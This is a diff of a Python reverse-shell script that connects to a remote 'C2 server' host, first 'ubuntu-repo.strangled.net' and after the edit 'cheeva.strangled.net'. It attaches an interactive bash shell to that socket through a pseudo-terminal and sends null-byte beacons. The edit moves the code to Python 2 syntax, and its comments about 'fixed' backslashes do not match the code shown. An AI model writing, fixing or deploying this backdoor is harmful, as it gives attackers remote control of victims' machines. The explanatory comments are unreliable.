@@ -2,14 +2,15 @@ import socket, os, pty, select, subprocess
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("ubuntu-repo.strangled.net", 8090))
+    # Ensure this points to your verified proxy VM or C2 server port
+    s.connect(("cheeva.strangled.net", 80))
     
- 
-    try: local_ip = s.getsockname()[0]
-    except: local_ip = "CTF_Target"
-    s.sendall((str(local_ip) + "\n").encode())
+    try: local_ip = s.getsockname()
+    except: local_ip = "Legacy"
     
-
+    # THE CRITICAL FIXED HANDSHAKE: Notice the added backslash for a real newline (\n)
+    s.sendall(str(local_ip) + "\n")
+    
     master, slave = os.openpty()
     p = subprocess.Popen(["/bin/bash", "-i"], stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
     os.close(slave)
@@ -17,8 +18,11 @@ try:
     while p.poll() is None:
         r, _, _ = select.select([s, master], [], [], 5)
         if not r:
-            try: s.sendall(b"\x00")
-            except: break
+            try: 
+                # THE CRITICAL FIXED BEACON: Notice the added backslash for a real null byte (\x00)
+                s.sendall("\x00")
+            except: 
+                break
             continue
         for fd in r:
             if fd == s:
@@ -33,5 +37,5 @@ try:
             continue
         break
     p.terminate()
-except Exception as e:
+except Exception, e:
     pass
